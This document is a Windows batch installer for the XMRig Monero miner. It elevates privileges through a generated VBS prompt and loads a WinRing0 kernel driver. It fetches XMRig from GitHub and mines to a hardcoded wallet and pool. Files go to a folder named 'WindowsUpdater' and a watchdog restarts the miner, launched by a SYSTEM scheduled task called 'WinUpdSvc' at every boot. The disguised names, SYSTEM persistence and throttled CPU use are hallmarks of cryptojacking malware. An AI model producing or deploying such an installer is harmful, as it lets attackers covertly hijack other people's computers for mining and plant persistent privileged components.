@echo off
REM Force the window to be visible
title Monero Miner Setup - High Mid-End PC
color 0A

REM ====================================================================
REM Ultimate Monero Miner - High Mid-End Edition
REM Optimized for 6-core CPUs with 12-16GB RAM (e.g., Intel i5-10400)
REM Installs to C:\ProgramData\WindowsUpdater as requested
REM ====================================================================
setlocal enableextensions enabledelayedexpansion

REM === Debug Logging ===
echo [*] Script started at %date% %time% > "%temp%\miner_debug.log"
echo [*] Running as user: %username% >> "%temp%\miner_debug.log"

REM === CONFIGURATION ===
set "SRC=%~dp0miner_src"
set "DEST=C:\ProgramData\WindowsUpdater"
set "TASK_NAME=WinUpdSvc"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "POOL=gulf.moneroocean.stream:10128"
set "LOG_FILE=%DEST%\miner.log"
set "GITHUB_API=https://api.github.com/repos/xmrig/xmrig/releases/latest"

REM === One-Time Admin Enforcement ===
echo [*] Checking for admin privileges...
echo [*] Checking for admin privileges... >> "%temp%\miner_debug.log"
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
    echo [!] Admin privileges not detected. Attempting to elevate...
    echo [!] Admin privileges not detected. Attempting to elevate... >> "%temp%\miner_debug.log"
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs"
    exit /b
)
echo [✔] Running with admin privileges.
echo [✔] Running with admin privileges. >> "%temp%\miner_debug.log"

echo ===============================
echo Starting Monero Miner on High Mid-End PC
echo ===============================

echo [*] Initial setup complete. Press any key to continue...
pause

REM === Clean Up Existing Task and MSR Driver ===
schtasks /delete /tn "%TASK_NAME%" /f
sc stop WinRing0_1_2_0 >nul 2>&1
sc delete WinRing0_1_2_0 >nul 2>&1

REM === MSR Driver Installation (With Fallback) ===
if exist "%SRC%\winring0x64.sys" (
    sc create WinRing0_1_2_0 binPath= "%SRC%\winring0x64.sys" type= kernel start= demand
    sc start WinRing0_1_2_0
)

REM === System Optimization ===
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /hibernate off
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCIDLE 0
powercfg /setactive SCHEME_CURRENT

REM === CPU Core Detection ===
set "AFFINITY_MASK="
for /f "tokens=2 delims==" %%A in ('wmic cpu get NumberOfCores /value ^| find "="') do (
    set /a "CORES=%%A"
    set /a "AFFINITY_MASK=(1<<%%A)-1"
)
if not defined AFFINITY_MASK (
    set "AFFINITY_MASK=63"
)

REM === Auto-Update Miner ===
set "URL="
for /f "delims=" %%A in ('powershell -NoProfile -Command ^
  "try {$r=Invoke-RestMethod -Uri '%GITHUB_API%' -UseBasicParsing -ErrorAction Stop;$a=$r.assets^|?{$_.name-match'win64.*msvc.*zip'}^|Select -First 1;if($a){$a.browser_download_url}else{''}}"') do set "URL=%%A"

if defined URL (
    powershell -Command "try {IWR -Uri '%URL%' -OutFile '%TEMP%\xmrig.zip' -UseBasicParsing -ErrorAction Stop}" 2>> "%temp%\miner_debug.log"
    if '%errorlevel%' equ '0' (
        if exist "%TEMP%\xmrig.zip" (
            if not exist "%SRC%" mkdir "%SRC%"
            powershell -Command "try {Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%SRC%' -Force}" 2>> "%temp%\miner_debug.log"
            del "%TEMP%\xmrig.zip"
        )
    )
)

REM === Install Files ===
if not exist "%DEST%" mkdir "%DEST%"
xcopy /Y /Q "%SRC%\*" "%DEST%\" >nul

REM === Generate Config File ===
(
  echo {
  echo   "autosave": true,
  echo   "cpu": {
  echo     "enabled": true,
  echo     "huge-pages": true,
  echo     "hw-aes": true,
  echo     "priority": 2,
  echo     "memory-pool": true,
  echo     "asm": true,
  echo     "max-threads-hint": 15,
  echo     "max-cpu-usage": 15,
  echo     "affinity": !AFFINITY_MASK!
  echo   },
  echo   "opencl": false,
  echo   "cuda": false,
  echo   "pools": [
  echo     {
  echo       "url": "%POOL%",
  echo       "user": "%WALLET%",
  echo       "pass": "%COMPUTERNAME%",
  echo       "keepalive": true,
  echo       "tls": false
  echo     }
  echo   ]
  echo }
) > "%DEST%\config.json"

REM === FIXED WATCHDOG SCRIPT (safe single-run check) ===
(
  echo @echo off
  echo set "MINER=%DEST%\xmrig.exe"
  echo set "CONFIG=%DEST%\config.json"
  echo set "LOG=%LOG_FILE%"
  echo :loop
  echo tasklist /fi "imagename eq xmrig.exe" ^| find /i "xmrig.exe" ^>nul
  echo if errorlevel 1 (
  echo     echo [*] xmrig not running. Starting miner...
  echo     start "" /low "%DEST%\xmrig.exe" --config="%%CONFIG%%" --randomx-1gb-pages --donate-level=0 --log-file="%%LOG%%" --print-time=60
  echo )
  echo ping 127.0.0.1 -n 60 ^>nul
  echo goto loop
) > "%DEST%\run_watchdog.bat"

REM === Permanent Auto-Start ===
schtasks /create /tn "%TASK_NAME%" ^
  /tr "cmd /c start \"\" /min \"%DEST%\run_watchdog.bat\"" ^
  /sc onstart ^
  /ru SYSTEM ^
  /rl HIGHEST ^
  /f

REM Start the watchdog (minimized)
start "" /min "%DEST%\run_watchdog.bat"

echo [✔] Miner installed (optimized for high mid-end PC)
echo CPU Affinity: !AFFINITY_MASK!
echo Logs: %LOG_FILE%
echo Uninstall: schtasks /delete /tn "%TASK_NAME%" /f ^>nul ^&^& rmdir /s /q "%DEST%"
echo [✔] Miner installed at %date% %time% >> "%temp%\miner_debug.log"
pause
